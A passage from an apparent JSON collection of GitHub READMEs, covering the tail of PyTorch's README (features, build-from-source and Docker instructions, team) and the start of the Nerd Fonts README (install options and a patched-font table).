and Contributing](#releases-and-contributing)\n- [The Team](#the-team)\n\n| System | 2.7 | 3.5 | 3.6 |\n| :---: | :---: | :---: | :--: |\n| Linux CPU | [![Build Status](https:\/\/ci.pytorch.org\/jenkins\/job\/pytorch-master\/badge\/icon)](https:\/\/ci.pytorch.org\/jenkins\/job\/pytorch-master\/) | [![Build Status](https:\/\/ci.pytorch.org\/jenkins\/job\/pytorch-master\/badge\/icon)](https:\/\/ci.pytorch.org\/jenkins\/job\/pytorch-master\/) | <center>\u2014<\/center> |\n| Linux GPU | [![Build Status](https:\/\/ci.pytorch.org\/jenkins\/job\/pytorch-master\/badge\/icon)](https:\/\/ci.pytorch.org\/jenkins\/job\/pytorch-master\/) | [![Build Status](https:\/\/ci.pytorch.org\/jenkins\/job\/pytorch-master\/badge\/icon)](https:\/\/ci.pytorch.org\/jenkins\/job\/pytorch-master\/) | <center>\u2014<\/center> |\n| Windows CPU \/ GPU | <center>\u2014<\/center> | [![Build Status](https:\/\/ci.pytorch.org\/jenkins\/job\/pytorch-builds\/job\/pytorch-win-ws2016-cuda9-cudnn7-py3-trigger\/badge\/icon)](https:\/\/ci.pytorch.org\/jenkins\/job\/pytorch-builds\/job\/pytorch-win-ws2016-cuda9-cudnn7-py3-trigger\/) |  <center>\u2014<\/center> |\n| Linux (ppc64le) CPU | [![Build Status](https:\/\/powerci.osuosl.org\/job\/pytorch-master-nightly-py2-linux-ppc64le\/badge\/icon)](https:\/\/powerci.osuosl.org\/job\/pytorch-master-nightly-py2-linux-ppc64le\/) | \u2014 | [![Build Status](https:\/\/powerci.osuosl.org\/job\/pytorch-master-nightly-py3-linux-ppc64le\/badge\/icon)](https:\/\/powerci.osuosl.org\/job\/pytorch-master-nightly-py3-linux-ppc64le\/) |\n| Linux (ppc64le) GPU | [![Build Status](https:\/\/powerci.osuosl.org\/job\/pytorch-linux-cuda9-cudnn7-py2-mpi-build-test-gpu\/badge\/icon)](https:\/\/powerci.osuosl.org\/job\/pytorch-linux-cuda9-cudnn7-py2-mpi-build-test-gpu\/) | \u2014 | [![Build Status](https:\/\/powerci.osuosl.org\/job\/pytorch-linux-cuda92-cudnn7-py3-mpi-build-test-gpu\/badge\/icon)](https:\/\/powerci.osuosl.org\/job\/pytorch-linux-cuda92-cudnn7-py3-mpi-build-test-gpu\/) |\n\nSee also the [ci.pytorch.org HUD](https:\/\/ezyang.github.io\/pytorch-ci-hud\/build\/pytorch-master).\n\n\n## More About PyTorch\n\nAt a granular level, PyTorch is a library that consists of the following components:\n\n| Component | Description |\n| ---- | --- |\n| [**torch**](https:\/\/pytorch.org\/docs\/stable\/torch.html) | a Tensor library like NumPy, with strong GPU support |\n| [**torch.autograd**](https:\/\/pytorch.org\/docs\/stable\/autograd.html) | a tape-based automatic differentiation library that supports all differentiable Tensor operations in torch |\n| [**torch.jit**](https:\/\/pytorch.org\/docs\/stable\/jit.html) | a compilation stack (TorchScript) to create serializable and optimizable models from PyTorch code  |\n| [**torch.nn**](https:\/\/pytorch.org\/docs\/stable\/nn.html) | a neural networks library deeply integrated with autograd designed for maximum flexibility |\n| [**torch.multiprocessing**](https:\/\/pytorch.org\/docs\/stable\/multiprocessing.html) | Python multiprocessing, but with magical memory sharing of torch Tensors across processes. Useful for data loading and Hogwild training |\n| [**torch.utils**](https:\/\/pytorch.org\/docs\/stable\/data.html) | DataLoader and other utility functions for convenience |\n\nUsually PyTorch is used either as:\n\n- a replacement for NumPy to use the power of GPUs.\n- a deep learning research platform that provides maximum flexibility and speed.\n\nElaborating further:\n\n### A GPU-Ready Tensor Library\n\nIf you use NumPy, then you have used Tensors (a.k.a ndarray).\n\n![Tensor illustration](.\/docs\/source\/_static\/img\/tensor_illustration.png)\n\nPyTorch provides Tensors that can live either on the CPU or the GPU, and accelerates the\ncomputation by a huge amount.\n\nWe provide a wide variety of tensor routines to accelerate and fit your scientific computation needs\nsuch as slicing, indexing, math operations, linear algebra, reductions.\nAnd they are fast!\n\n### Dynamic Neural Networks: Tape-Based Autograd\n\nPyTorch has a unique way of building neural networks: using and replaying a tape recorder.\n\nMost frameworks such as TensorFlow, Theano, Caffe and CNTK have a static view of the world.\nOne has to build a neural network, and reuse the same structure again and again.\nChanging the way the network behaves means that one has to start from scratch.\n\nWith PyTorch, we use a technique called reverse-mode auto-differentiation, which allows you to\nchange the way your network behaves arbitrarily with zero lag or overhead. Our inspiration comes\nfrom several research papers on this topic, as well as current and past work such as\n[torch-autograd](https:\/\/github.com\/twitter\/torch-autograd),\n[autograd](https:\/\/github.com\/HIPS\/autograd),\n[Chainer](https:\/\/chainer.org), etc.\n\nWhile this technique is not unique to PyTorch, it's one of the fastest implementations of it to date.\nYou get the best of speed and flexibility for your crazy research.\n\n![Dynamic graph](https:\/\/github.com\/pytorch\/pytorch\/blob\/master\/docs\/source\/_static\/img\/dynamic_graph.gif)\n\n### Python First\n\nPyTorch is not a Python binding into a monolithic C++ framework.\nIt is built to be deeply integrated into Python.\nYou can use it naturally like you would use [NumPy](https:\/\/www.numpy.org\/) \/ [SciPy](https:\/\/www.scipy.org\/) \/ [scikit-learn](https:\/\/scikit-learn.org) etc.\nYou can write your new neural network layers in Python itself, using your favorite libraries\nand use packages such as Cython and Numba.\nOur goal is to not reinvent the wheel where appropriate.\n\n### Imperative Experiences\n\nPyTorch is designed to be intuitive, linear in thought and easy to use.\nWhen you execute a line of code, it gets executed. There isn't an asynchronous view of the world.\nWhen you drop into a debugger, or receive error messages and stack traces, understanding them is straightforward.\nThe stack trace points to exactly where your code was defined.\nWe hope you never spend hours debugging your code because of bad stack traces or asynchronous and opaque execution engines.\n\n### Fast and Lean\n\nPyTorch has minimal framework overhead. We integrate acceleration libraries\nsuch as [Intel MKL](https:\/\/software.intel.com\/mkl) and NVIDIA (cuDNN, NCCL) to maximize speed.\nAt the core, its CPU and GPU Tensor and neural network backends\n(TH, THC, THNN, THCUNN) are mature and have been tested for years.\n\nHence, PyTorch is quite fast \u2013 whether you run small or large neural networks.\n\nThe memory usage in PyTorch is extremely efficient compared to Torch or some of the alternatives.\nWe've written custom memory allocators for the GPU to make sure that\nyour deep learning models are maximally memory efficient.\nThis enables you to train bigger deep learning models than before.\n\n### Extensions Without Pain\n\nWriting new neural network modules, or interfacing with PyTorch's Tensor API was designed to be straightforward\nand with minimal abstractions.\n\nYou can write new neural network layers in Python using the torch API\n[or your favorite NumPy-based libraries such as SciPy](https:\/\/pytorch.org\/tutorials\/advanced\/numpy_extensions_tutorial.html).\n\nIf you want to write your layers in C\/C++, we provide a convenient extension API that is efficient and with minimal boilerplate.\nNo wrapper code needs to be written. You can see [a tutorial here](https:\/\/pytorch.org\/tutorials\/advanced\/cpp_extension.html) and [an example here](https:\/\/github.com\/pytorch\/extension-cpp).\n\n\n## Installation\n\n### Binaries\nCommands to install from binaries via Conda or pip wheels are on our website:\n[https:\/\/pytorch.org](https:\/\/pytorch.org)\n\n\n#### NVIDIA Jetson platforms\n\nPython wheels for NVIDIA's Jetson Nano, Jetson TX2, and Jetson AGX Xavier are available via the following URLs:\n\n- Stable binaries:\n  - Python 2.7: https:\/\/nvidia.box.com\/v\/torch-stable-cp27-jetson-jp42\n  - Python 3.6: https:\/\/nvidia.box.com\/v\/torch-stable-cp36-jetson-jp42\n- Rolling weekly binaries:\n  - Python 2.7: https:\/\/nvidia.box.com\/v\/torch-weekly-cp27-jetson-jp42\n  - Python 3.6: https:\/\/nvidia.box.com\/v\/torch-weekly-cp36-jetson-jp42\n\nThey require JetPack 4.2 and above, and @dusty-nv maintains them\n\n\n### From Source\n\nIf you are installing from source, you will need a C++14 compiler. Also, we highly recommend installing an [Anaconda](https:\/\/www.anaconda.com\/distribution\/#download-section) environment.\nYou will get a high-quality BLAS library (MKL) and you get controlled dependency versions regardless of your Linux distro.\n\nOnce you have [Anaconda](https:\/\/www.anaconda.com\/distribution\/#download-section) installed, here are the instructions.\n\nIf you want to compile with CUDA support, install\n- [NVIDIA CUDA](https:\/\/developer.nvidia.com\/cuda-downloads) 9 or above\n- [NVIDIA cuDNN](https:\/\/developer.nvidia.com\/cudnn) v7 or above\n\nIf you want to disable CUDA support, export environment variable `USE_CUDA=0`.\nOther potentially useful environment variables may be found in `setup.py`.\n\nIf you are building for NVIDIA's Jetson platforms (Jetson Nano, TX1, TX2, AGX Xavier), Instructions to [are available here](https:\/\/devtalk.nvidia.com\/default\/topic\/1049071\/jetson-nano\/pytorch-for-jetson-nano\/)\n\n\n#### Install Dependencies\n\nCommon (only install `typing` for Python <3.5)\n```\nconda install numpy ninja pyyaml mkl mkl-include setuptools cmake cffi typing\n```\n\nOn Linux\n```bash\n# Add LAPACK support for the GPU if needed\nconda install -c pytorch magma-cuda90 # or [magma-cuda92 | magma-cuda100 | magma-cuda101 ] depending on your cuda version\n```\n\n#### Get the PyTorch Source\n```bash\ngit clone --recursive https:\/\/github.com\/pytorch\/pytorch\ncd pytorch\n# if you are updating an existing checkout\ngit submodule sync\ngit submodule update --init --recursive\n```\n\n#### Install PyTorch\nOn Linux\n```bash\nexport CMAKE_PREFIX_PATH=${CONDA_PREFIX:-\"$(dirname $(which conda))\/..\/\"}\npython setup.py install\n```\n\nOn macOS\n```bash\nexport CMAKE_PREFIX_PATH=${CONDA_PREFIX:-\"$(dirname $(which conda))\/..\/\"}\nMACOSX_DEPLOYMENT_TARGET=10.9 CC=clang CXX=clang++ python setup.py install\n```\n\nEach CUDA version only supports one particular XCode version. The following combinations have been reported to work with PyTorch.\n\n| CUDA version | XCode version |\n| ------------ | ------------- |\n| 10.0         | XCode 9.4     |\n| 10.1         | XCode 10.1    |\n\n\nOn Windows\n\nAt least Visual Studio 2017 Update 3 (version 15.3.3 with the toolset 14.11) and [NVTX](https:\/\/docs.nvidia.com\/gameworks\/content\/gameworkslibrary\/nvtx\/nvidia_tools_extension_library_nvtx.htm) are needed.\n\nIf the version of Visual Studio 2017 is higher than 15.4.5, installing of \"VC++ 2017 version 15.4 v14.11 toolset\" is strongly recommended.\n<br\/> If the version of Visual Studio 2017 is lesser than 15.3.3, please update Visual Studio 2017 to the latest version along with installing \"VC++ 2017 version 15.4 v14.11 toolset\".\n<br\/> There is no guarantee of the correct building with VC++ 2017 toolsets, others than version 15.4 v14.11.\n<br\/> \"VC++ 2017 version 15.4 v14.11 toolset\" might be installed onto already installed Visual Studio 2017 by running its installation once again and checking the corresponding checkbox under \"Individual components\"\/\"Compilers, build tools, and runtimes\".\n\nNVTX is a part of CUDA distributive, where it is called \"Nsight Compute\". To install it onto already installed CUDA run CUDA installation once again and check the corresponding checkbox.\nBe sure that CUDA with Nsight Compute is installed after Visual Studio 2017.\n\nCurrently VS 2017, VS 2019 and Ninja are supported as the generator of CMake. If `ninja.exe` is detected in `PATH`, then Ninja will be used as the default generator, otherwise it will use VS 2017.\n<br\/> If Ninja is selected as the generator, the latest MSVC which is newer than VS 2015 (14.0) will get selected as the underlying toolchain if you have Python > 3.5, otherwise VS 2015 will be selected so you'll have to activate the environment. If you use CMake <= 3.14.2 and has VS 2019 installed, then even if you specify VS 2017 as the generator, VS 2019 will get selected as the generator.\n\nCUDA and MSVC have strong version dependencies, so even if you use VS 2017 \/ 2019, you will get build errors like `nvcc fatal : Host compiler targets unsupported OS`. For this kind of problem, please install the corresponding VS toolchain in the table below and then you can either specify the toolset during activation (recommended) or set `CUDAHOSTCXX` to override the cuda host compiler (not recommended if there are big version differences).\n\n| CUDA version | Newest supported VS version                             |\n| ------------ | ------------------------------------------------------- |\n| 9.0 \/ 9.1    | Visual Studio 2017 Update 4 (15.4) (`_MSC_VER` <= 1911) |\n| 9.2          | Visual Studio 2017 Update 5 (15.5) (`_MSC_VER` <= 1912) |\n| 10.0         | Visual Studio 2017 (15.X) (`_MSC_VER` < 1920)           |\n| 10.1         | Visual Studio 2019 (16.X) (`_MSC_VER` < 1930)           |\n\n```cmd\ncmd\n:: [Optional] Only add the next two lines if you need Python 2.7. If you use Python 3, ignore these two lines.\nset MSSdk=1\nset FORCE_PY27_BUILD=1\n\n:: [Optional] If you want to build with VS 2019 generator, please change the value in the next line to `Visual Studio 16 2019`.\n:: Note: This value is useless if Ninja is detected. However, you can force that by using `set USE_NINJA=OFF`.\nset CMAKE_GENERATOR=Visual Studio 15 2017\n\n:: Read the content in the previous section carefully before you proceed.\n:: [Optional] If you want to override the underlying toolset used by Ninja and Visual Studio with CUDA, please run the following script block.\n:: \"Visual Studio 2017 Developer Command Prompt\" will be run automatically.\n:: Make sure you have CMake >= 3.12 before you do this when you use the Visual Studio generator.\n:: It's an essential step if you use Python 3.5.\nset CMAKE_GENERATOR_TOOLSET_VERSION=14.11\nset DISTUTILS_USE_SDK=1\nfor \/f \"usebackq tokens=*\" %i in (`\"%ProgramFiles(x86)%\\Microsoft Visual Studio\\Installer\\vswhere.exe\" -version [15^,16^) -products * -latest -property installationPath`) do call \"%i\\VC\\Auxiliary\\Build\\vcvarsall.bat\" x64 -vcvars_ver=%CMAKE_GENERATOR_TOOLSET_VERSION%\n\n:: [Optional] If you want to override the cuda host compiler\nset CUDAHOSTCXX=C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Enterprise\\VC\\Tools\\MSVC\\14.11.25503\\bin\\HostX64\\x64\\cl.exe\n\npython setup.py install\n\n```\n\n##### Adjust Build Options (Optional)\n\nYou can adjust the configuration of cmake variables optionally (without building first), by doing\nthe following. For example, adjusting the pre-detected directories for CuDNN or BLAS can be done\nwith such a step.\n\nOn Linux\n```bash\nexport CMAKE_PREFIX_PATH=${CONDA_PREFIX:-\"$(dirname $(which conda))\/..\/\"}\npython setup.py build --cmake-only\nccmake build  # or cmake-gui build\n```\n\nOn macOS\n```bash\nexport CMAKE_PREFIX_PATH=${CONDA_PREFIX:-\"$(dirname $(which conda))\/..\/\"}\nMACOSX_DEPLOYMENT_TARGET=10.9 CC=clang CXX=clang++ python setup.py build --cmake-only\nccmake build  # or cmake-gui build\n```\n\n### Docker Image\n\nDockerfile is supplied to build images with cuda support and cudnn v7. You can pass `-e PYTHON_VERSION=x.y` flag to specify which Python version is to be used by Miniconda, or leave it unset to use the default. Build from pytorch repo directory as docker needs to copy git repo into docker filesystem while building the image.\n```\ndocker build -t pytorch -f docker\/pytorch\/Dockerfile .  # [optional] --build-arg WITH_TORCHVISION=0\n```\n\nYou can also pull a pre-built docker image from Docker Hub and run with nvidia-docker,\nbut this is not currently maintained and will pull PyTorch 0.2.\n```\nnvidia-docker run --rm -ti --ipc=host pytorch\/pytorch:latest\n```\nPlease note that PyTorch uses shared memory to share data between processes, so if torch multiprocessing is used (e.g.\nfor multithreaded data loaders) the default shared memory segment size that container runs with is not enough, and you\nshould increase shared memory size either with `--ipc=host` or `--shm-size` command line options to `nvidia-docker run`.\n\n### Building the Documentation\n\nTo build documentation in various formats, you will need [Sphinx](http:\/\/www.sphinx-doc.org) and the\nreadthedocs theme.\n\n```\ncd docs\/\npip install -r requirements.txt\n```\nYou can then build the documentation by running ``make <format>`` from the\n``docs\/`` folder. Run ``make`` to get a list of all available output formats.\n\n### Previous Versions\n\nInstallation instructions and binaries for previous PyTorch versions may be found\non [our website](https:\/\/pytorch.org\/previous-versions).\n\n\n## Getting Started\n\nThree pointers to get you started:\n- [Tutorials: get you started with understanding and using PyTorch](https:\/\/pytorch.org\/tutorials\/)\n- [Examples: easy to understand pytorch code across all domains](https:\/\/github.com\/pytorch\/examples)\n- [The API Reference](https:\/\/pytorch.org\/docs\/)\n\n## Communication\n* forums: discuss implementations, research, etc. https:\/\/discuss.pytorch.org\n* GitHub issues: bug reports, feature requests, install issues, RFCs, thoughts, etc.\n* Slack: The [PyTorch Slack](https:\/\/pytorch.slack.com\/) hosts a primary audience of moderate to experienced PyTorch users and developers for general chat, online discussions, collaboration etc. If you are a beginner looking for help, the primary medium is [PyTorch Forums](https:\/\/discuss.pytorch.org). If you need a slack invite, please fill this form: https:\/\/goo.gl\/forms\/PP1AGvNHpSaJP8to1\n* newsletter: no-noise, one-way email newsletter with important announcements about pytorch. You can sign-up here: https:\/\/eepurl.com\/cbG0rv\n\n## Releases and Contributing\n\nPyTorch has a 90 day release cycle (major releases). Please let us know if you encounter a bug by [filing an issue](https:\/\/github.com\/pytorch\/pytorch\/issues).\n\nWe appreciate all contributions. If you are planning to contribute back bug-fixes, please do so without any further discussion.\n\nIf you plan to contribute new features, utility functions or extensions to the core, please first open an issue and discuss the feature with us.\nSending a PR without discussion might end up resulting in a rejected PR, because we might be taking the core in a different direction than you might be aware of.\n\n## The Team\n\nPyTorch is a community driven project with several skillful engineers and researchers contributing to it.\n\nPyTorch is currently maintained by [Adam Paszke](https:\/\/apaszke.github.io\/), [Sam Gross](https:\/\/github.com\/colesbury), [Soumith Chintala](http:\/\/soumith.ch) and [Gregory Chanan](https:\/\/github.com\/gchanan) with major contributions coming from hundreds of talented individuals in various forms and means.\nA non-exhaustive but growing list needs to mention: Trevor Killeen, Sasank Chilamkurthy, Sergey Zagoruyko, Adam Lerer, Francisco Massa, Alykhan Tejani, Luca Antiga, Alban Desmaison, Andreas Koepf, James Bradbury, Zeming Lin, Yuandong Tian, Guillaume Lample, Marat Dukhan, Natalia Gimelshein, Christian Sarofeen, Martin Raison, Edward Yang, Zachary Devito.\n\nNote: this project is unrelated to [hughperkins\/pytorch](https:\/\/github.com\/hughperkins\/pytorch) with the same name. Hugh is a valuable contributor in the Torch community and has helped with many things Torch and PyTorch.\n\n## License\n\nPyTorch is BSD-style licensed, as found in the LICENSE file.\n"},{"repo":"\/ryanoasis\/nerd-fonts","language":"CSS","readme_contents":"<h1 align=\"center\">\n  <img src=\"images\/nerd-fonts-logo.svg\" alt=\"Nerd Fonts Logo\" \/>\n<\/h1>\n<h2 align=\"center\">\n  <img alt=\"Iconic font aggregator, collection, and patcher\" src=\"images\/project-subtitle-phrase.svg\">\n<\/h2>\n\n<div align=\"center\">\n\n[Releases][release]&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;[Fonts](#patched-fonts)&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;[Font Patcher](#font-patcher)&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;[Wiki Documentation][wiki]&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;[Stickers][stickers]&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;[VimDevIcons][vim-devicons]\n\n\n[![GitHub release][img-version-badge]][repo] [![Gitter][img-gitter-badge]][gitter] [![Build Status][img-travis-ci]][travis-ci] [![Code of Conduct][coc-badge]][coc] [![PRs Welcome][prs-badge]][prs]  <a href=\"#patched-fonts\" title=\"\"><img src=\"https:\/\/raw.githubusercontent.com\/wiki\/ryanoasis\/nerd-fonts\/images\/faux-shield-badge-os-logos.svg?sanitize=true\" alt=\"Nerd Fonts - OS Support\"><\/a> [![Twitter][twitter-badge]][twitter-intent]\n\n\n<\/div>\n\n\n**Nerd Fonts** is a project that patches developer targeted fonts with a high number of glyphs (icons). Specifically to add a high number of extra glyphs from popular 'iconic fonts' such as [Font Awesome \u27b6][font-awesome], [Devicons \u27b6][vorillaz-devicons], [Octicons \u27b6][octicons], and [others](#glyph-sets).\n\nThe following Sankey flow diagram shows the current glyph sets included:\n\n<p align=\"center\">\n  <img src=\"images\/sankey-glyphs-combined-diagram.svg\" alt=\"@SankeyMATIC Diagram\" \/>\n<\/p>\n<sub><i>Diagram created using <a href=\"http:\/\/sankeymatic.com\/\" title=\"SankeyMATIC (BETA): A Sankey diagram builder for everyone\">@SankeyMATIC<\/a><\/i><\/sub>\n\n\n## Important Notices\n* `master` branch file paths are **not** considered stable. [Verify your repository URI references](#unstable-file-paths)\n* cloning this repository is **not** recommended ([due to Repo size](#option-5-clone-the-repo)) unless you are going to be [contributing to development](#contributing)\n\n\n## Table of Contents\n\n[**TL;DR**](#tldr)\n\n[**Installation Options**](#font-installation)\n  * [**1 - Manual**](#option-1-download-and-install-manually)\n  * [**2 - Release Archive Download**](#option-2-release-archive-download)\n  * [**3 - Install Script**](#option-3-install-script)\n  * [**4 - Homebrew Fonts (macOS (OS X))**](#option-4-homebrew-fonts)\n  * [**5 - Clone Repo**](#option-5-clone-the-repo)\n  * [**6 - Ad Hoc Curl Download**](#option-6-ad-hoc-curl-download)\n  * [**7 - Arch User Repository (AUR) (Arch Linux)**](#option-7-unofficial-arch-user-repository-aur)\n  * [**8 - Patch Your Own Font**](#option-8-patch-your-own-font)\n\n[**Features**](#features)\n  * [**Glyph\/Icon sets**](#glyph-sets)\n  * [**Patched Fonts**](#patched-fonts)\n  * [**Combinations**](#combinations)\n  * [**Font Patcher**](#font-patcher)\n\n[**Developer \/ Contributor**](#font-patcher)\n  * [**Font Patcher**](#font-patcher)\n  * [**Gotta Patch 'em All Font Patcher!**](#gotta-patch-em-all)\n  * [**Other Good Fonts to Patch**](#other-good-fonts-to-patch)\n  * [**Contributing**](#contributing)\n\n[**Project Motivation**](#project-motivation)\n\n**Additional Info**\n  * [**Unstable file paths on master**](#unstable-file-paths)\n  * [**Changelog**](#changelog)\n  * [**License**](#license)\n\n\n## TL;DR\n  Nerd Fonts takes popular programming fonts and adds a bunch of Glyphs.\n  There is also a [font patcher](#font-patcher) available if your desired font isn't already patched.\n  For more high level information see the [wiki][wiki]. If you are looking for the Vim plugin see [VimDevIcons \u27b6][vim-devicons].\n\n### Various Download Options for Fonts\n\n_If you..._\n\n  * `Option 1.` want to **quickly** grab an **individual font** download from the [`patched-fonts\/` directory](#patched-fonts)\n  * `Option 2.` want to download a **font family** package of variations (bold, italic, etc.) see [download an archive](#option-2-release-archive-download)\n  * `Option 3.` want to **automate** installing or use in **scripts** see the [Install Script](#option-3-install-script)\n  * `Option 4.` are on **macOS** and want to use **Homebrew** see [Homebrew Fonts](#option-4-homebrew-fonts)\n  * `Option 5.` want **complete control** then see [cloning the repo](#option-5-clone-the-repo)\n  * `Option 6.` want to use the **`curl` command** or use in **scripts** see [Ad Hoc Curl Download](#option-6-ad-hoc-curl-download)\n  * `Option 7.` are on **Arch Linux** and want to use **AUR packages** see [Unofficial Arch User Repositories](#option-7-unofficial-arch-user-repository-aur)\n  * `Option 8.` want to patch your own font see the [Font Patcher](#option-8-patch-your-own-font)\n\n## Features\n* A [FontForge Python script](#font-patcher) to patch any font\n  * Includes an option to create **Monospaced (fixed-pitch, fixed-width)** _or_ **double-width (non-monospaced)** glyphs\n  * For more details see the [**Font Patcher**](#font-patcher) section\n* **`48`** already [patched font families](#patched-fonts)\n* Over **`1,356,400`** unique combinations\/variations of patched fonts [(more details)](#combinations)\n* Over **`2,600`** glyphs\/icons combined [(more details)](#combinations)\n  * Current glyph sets include: [Powerline with Extra Symbols][ryanoasis-powerline-extra-symbols], [Font Awesome][font-awesome], [Material Design Icons][font-material-design-icons], [Weather][font-weather], [Devicons][vorillaz-devicons], [Octicons][octicons], [Font Logos][font-linux] (Formerly [Font Linux][font-linux]), [Pomicons][gabrielelana-pomicons]\n* **Monospaced (fixed-pitch, fixed-width)** _or_ **double-width (non-monospaced)** glyphs version of each font\n  * This refers to the Nerd Font glyphs themselves not necessarily the Font as a whole\n* A Developer\/Contributor provided [bash script](#gotta-patch-em-all) to re-patch all the fonts\n\n\n## Glyph Sets\n\n:mag: :mag: You can now search for glyphs easily on [NerdFonts.com][Cheat Sheet] via the [Cheat Sheet][]\n\nSee [Wiki: Glyph Sets and Codepoints for more details][wiki-glyph-sets-codepoints]\n\n### Icon names in shell\n\nSee [Wiki: Icon names in shell][wiki-icon-names-in-shell]\n\n\n## Patched Fonts\n\n| Font Name                                         | Font Name and Repository          |\\*RFN | EM Size | Status            |\n|:--------------------------------------------------|:----------------------------------|:-----|:--------|:------------------|\n| [3270 Nerd Font][p-3270]                          | [3270][f-3270]                    | NO   | 1000    | ![w] ![m2] ![l]   |\n| [Agave][p-agave]                                  | [Agave][f-agave]                  | NO   | 2048    | ![w] ![m2] ![l]   |\n| [Anonymice Nerd Font][p-anonymous-pro]            | [Anonymous Pro][f-a-pro]          | NO   | 2048    | ![w] ![m2] ![l]   |\n| [Arimo][p-arimo]                                  | [Arimo][f-arimo]                  | NO   | 2048    | ![w] ![m2] ![l]   |\n| [Aurulent Sans Mono Nerd Font][p-aurulent]        |                                   | NO   | 1000    | ![w] ![m2] ![l]   |\n| [BigBlueTerminal][p-bigblueterm]                  |                                   | NO   | 1200    | ![w] ![m2] ![l]   |\n| [Bitstream Vera Sans Mono Nerd Font][p-bitstream] |                                   | NO   | 2048    | ![w] ![m2] ![l]   |\n| [Blex*][p-blex]                                   | [IBM Plex Mono][f-ibm-plex]       | YES  | 1000    | ![w] ![m2] ![l]   |\n| [Code New Roman Nerd Font][p-code-nr]             |                                   | NO   | 2048    | ![w] ![m2] ![l]   |\n| [Cousine Nerd Font][p-cousine]                    | [Cousine][f-cousine]              | NO   | 1000    | ![w] ![m2] ![l]   |\n| [DaddyTimeMono][p-daddytimemono]                  | [DaddyTimeMono][f-daddytimemono]  | NO   | 1024    | ![w] ![m2] ![l]   |\n| [DejaVu Sans Mono Nerd Font][p-dejavu]            |                                   | NO   | 2048    | ![w] ![m2] ![l]   |\n| [Droid Sans Mono Nerd Font][p-droid]              |                                   | NO   | 2048    | ![w] ![m2] ![l]   |\n| [Fantasque Sans Nerd Font][p-fantasque]           | [Fantasque Sans][f-fant]          | NO   | 2048    | ![w] ![m2] ![l]   |\n| [Fira Code Nerd Font][p-fira-code]                | [Fira Code][f-fira-code]          | NO   | 1000    | ![w] ![m2] ![l]   |\n| [Fira Mono Nerd Font][p-fira-mono]                | [Fira][f-fira-mono]               | NO   | 1000    | ![w] ![m2] ![l]   |\n| [Go Mono Nerd Font][p-go-mono]                    | [Go-Mono][f-go-mono]              | NO   | 1000    | ![w] ![m2] ![l]   |\n| [Gohu Nerd Font][p-gohu]                          | [Gohu TTF][f-gohu2],[Gohu][f-gohu]| NO   | 1000    | ![w] ![m2] ![l]   |\n| [Hack Nerd Font][p-hack]                          | [Hack][f-hack]                    | NO   | 2048    | ![w] ![m2] ![l]   |\n| [Hasklug Nerd Font*][p-hasklig]                   | [Hasklig][f-hasklig]              | YES  | 1000    | ![w] ![m2] ![l]   |\n| [Heavy Data Mono Nerd Font][p-heavy-data]         |                                   | NO   | 2048    | ![w] ![m2] ![l]   |\n| [Hermut Nerd Font][p-hermit]                      |                                   | NO   | 1000    | ![w] ![m2] ![l]   |\n| [iM-Writing*][p-im-writing]                       | [iA-Writer][f-ia-writer]          | YES  | 1000    | ![w] ![m2] ![l]   |\n| [Inconsolata Nerd Font][p-inconsolata]            |                                   | NO   | 1000    | ![w] ![m2] ![l]   |\n| [Inconsolata Go Nerd Font][p-inconsolata-go]      |                                   | NO   | 1000    | ![w] ![m2] ![l]   |\n| [Inconsolata LGC Nerd Font][p-inconsolata-lgc]    |                                   | NO   | 1000    | ![w] ![m2] ![l]   |\n| [Iosevka Nerd Font][p-iosevka]                    | [Iosevka][f-iosevka]              | NO   | 1000    | [#83][s-iosevka]  |\n| [Lekton Nerd Font][p-lekton]                      |                                   | NO   | 1000    | ![w] ![m2] ![l]   |\n| [Literation Mono Nerd Font*][p-liberation]        | [Liberation][f-liberation]        | YES  | 2048    | ![w] ![m2] ![l]   |\n| [Meslo Nerd Font][p-meslo]                        |                                   | NO   | 2048    | ![w] ![m2] ![l]   |\n| [Monofur Nerd Font][p-monofur]                    |                                   | NO   | 2400    | ![w] ![m2] ![l]   |\n| [Monoid Nerd Font][p-monoid]                      |                                   | NO   | 1536    | ![w] ![m2] ![l]   |\n| [Mononoki Nerd Font][p-mononoki]                  | [Mononoki][f-mononoki]            | NO   | 1024    | ![w] ![m2] ![l]   |\n| [M+ (MPlus) Nerd Font][p-mplus]                   |                                   | NO   | 1000    | ![w] ![m2] ![l]   |\n| [Noto][p-noto]                                    |                                   | NO   | 1000    | ![w] ![m2] ![l]   |\n| [OpenDyslexic][p-opendyslexic]                    |                                   | NO   | 1000    | ![w] ![m2] ![l]   |\n| [Overpass][p-overpass]                            |                                   | NO   | 1000    | ![w] ![m2] ![l]   |\n| [ProFont (Windows tweaked) Nerd Font][p-profont]  |                                   | NO   | 1200    | ![w] ![m2] ![l]   |\n| [ProFont (x11) Nerd Font][p-profont]              |                                   | NO   | 1000    | ![w] ![m2] ![l]   |\n| [ProggyClean Nerd Font][p-proggy-clean]           |                                   | NO   | 2048    | Imperfect         |\n| [Roboto Mono][p-roboto]                           |                                   | NO   | 2048    | ![w] ![m2] ![l]   |\n| [Sauce Code Nerd Font][p-source-code-pro]         | [Source][f-source]                | YES  | 1000    | ![w] ![m2] ![l]   |\n| [Shure Tech Mono Nerd Font*][p-share-tech-mono]   | [Share Tech Mono][f-share]        | YES  | 1000    | ![w] ![m2] ![l]   |\n| [Space Mono Nerd Font][p-space-mono]              | [Space Mono][f-space]             | NO   | 1000    | ![w] ![m2] ![l]   |\n| [Terminess Nerd Font*][p-terminus]                | [Terminus Font][f-terminus]       | YES  | 1000    | ![w] ![m2] ![l]   |\n| [Tinos][p-tinos]                                  |                                   | NO   | 2048    | ![w] ![m2] ![l]   |\n| [Ubuntu Nerd Font][p-ubuntu]                      |                                   | NO   | 1000    | ![w] ![m2] ![l]   |\n| [Ubuntu Mono Nerd Font][p-ubuntu-mono]            |                                   | NO   | 1000    | ![w] ![m2] ![l]   |\n| [Victor Mono][p-victor]                           | [Victor Mono][f-victor]           | NO   | 1000    | ![w] ![m2] ![l]   |\n\n<sub>_*RFN = Reserved Font Name_<\/sub>\n\n## Combinations\n\n- Over **`1,200,000`** unique variations\/combinations (Power Set) of patched fonts:\n  - **`44`** patched font typefaces\n  - **`612`** patched font families\n  - **`2,448`** 'complete' 